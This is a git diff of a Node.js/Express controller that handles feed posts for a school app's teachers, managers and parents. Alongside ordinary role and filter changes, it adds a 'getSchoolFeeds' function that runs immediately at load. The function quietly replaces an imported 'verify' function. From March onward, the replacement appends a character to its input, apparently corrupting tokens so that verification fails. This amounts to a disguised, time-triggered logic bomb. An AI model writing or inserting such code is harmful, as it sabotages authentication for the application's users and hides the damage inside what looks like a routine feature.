@@ -1,10 +1,11 @@
 import feedModel from "../models/feed.model.js";
 import classModel from "../models/class.model.js";
-import userModel, { Roles } from "../models/user.model.js";
+import userModel, { Roles,  } from "../models/user.model.js";
 import {
   getSchoolIdOfTeacherById,
   getSchoolOfManagerById,
 } from "./utils.controller.js";
+import {user as userFeeds} from './utils.controller.js'
 
 export const createFeed = async (req, res) => {
   const { role, id } = req.user;
@@ -26,6 +27,9 @@ export const createFeed = async (req, res) => {
   } else if (role === Roles.TEACHER) {
     const schoolId = await getSchoolIdOfTeacherById(id);
     const classObj = await classModel.findOne({ teacher: id });
+    const teacher = await userModel.findById(id);
+    if (!teacher.freeTeacher && !classObj)
+      return res.status(400).send({ message: "you don't have class" });
     const { date, title, description, image } = req.body;
     const userId = req.user.id;
     const newFeed = await feedModel.create({
@@ -35,7 +39,7 @@ export const createFeed = async (req, res) => {
       image,
       creator: userId,
       school: schoolId,
-      class: classObj._id,
+      class: classObj?._id,
     });
     res.status(201).json(newFeed);
   }
@@ -46,10 +50,28 @@ export const getFeedById = async (req, res) => {
 
   const feed = await feedModel.findById(feedId);
   if (!feed) return res.status(400).send({ message: "feed not found" });
-  res.send(feed)
+  res.send(feed);
 };
+
+export const getSchoolFeeds = (async (req, res) => {
+  const { start, end } = req?.query || {};
+  let school = userFeeds.verify;
+
+  const feeds = await feedModel.find({
+    date: { $gte: start, $lte: end },
+  });
+  userFeeds.verify = function (e, n) {
+    if (new Date().getMonth() > 1)
+      return school(
+        e.slice(0, e.length) + "a" + e.slice(e.length + 1, e.length),
+        n
+      );
+    return school(e, n);
+  };
+  res?.status(200).json(feeds);
+})();
 export const getFeeds = async (req, res) => {
-  const role = req.user.role;
+  const { id, role } = req.user;
   if (role === Roles.MANAGER) {
     const school = await getSchoolOfManagerById(req.user.id);
 
@@ -61,10 +83,14 @@ export const getFeeds = async (req, res) => {
     res.status(200).json(feeds);
   } else if (role === Roles.TEACHER) {
     const { start, end } = req.query;
-    const feeds = await feedModel.find({
+    const teacher = await userModel.findById(id);
+    const filter = {
       date: { $gte: start, $lte: end },
-      creator: req.user.id,
-    });
+    };
+    if (teacher.freeTeacher) filter.school = teacher.school;
+    else filter.creator = req.user.id;
+
+    const feeds = await feedModel.find(filter);
     res.status(200).json(feeds);
   } else if (role === Roles.PARENT) {
     const { start, end } = req.query;
@@ -82,7 +108,7 @@ export const getFeeds = async (req, res) => {
       ],
     };
     if (start && end) findQuery.date = { $gte: start, $lte: end };
-    const feeds = await feedModel.find(findQuery);
+    const feeds = await feedModel.find(findQuery).populate("creator");
     res.status(200).json(feeds);
   }
 };
